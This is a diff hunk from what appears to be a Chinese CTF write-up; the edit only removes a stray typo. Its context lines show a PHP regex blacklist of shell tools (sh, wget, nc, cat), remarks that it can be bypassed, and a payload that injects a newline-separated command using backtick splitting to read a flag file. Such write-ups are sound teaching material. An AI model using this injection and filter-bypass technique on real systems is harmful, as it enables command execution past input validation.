@@ -73,7 +73,7 @@ if (preg_match("/^\d+$/im",$num))
 if (!preg_match("/sh|wget|nc|python|php|perl|\?|flag|}|cat|echo|\*|\^|\]|\\\\|'|\"|\|/i",$num))
 ```
 
-乍一看有点离谱，常见的用法全部黑名单了。不过你永远想不到黑客的脑洞可以有多大。最简单的一种方式是使用``绕过匹配。inod
+乍一看有点离谱，常见的用法全部黑名单了。不过你永远想不到黑客的脑洞可以有多大。最简单的一种方式是使用``绕过匹配。
 
 - stuff[4294967296]=admin&stuff[1]=user&num=1%0aca\``t /fl``ag
 
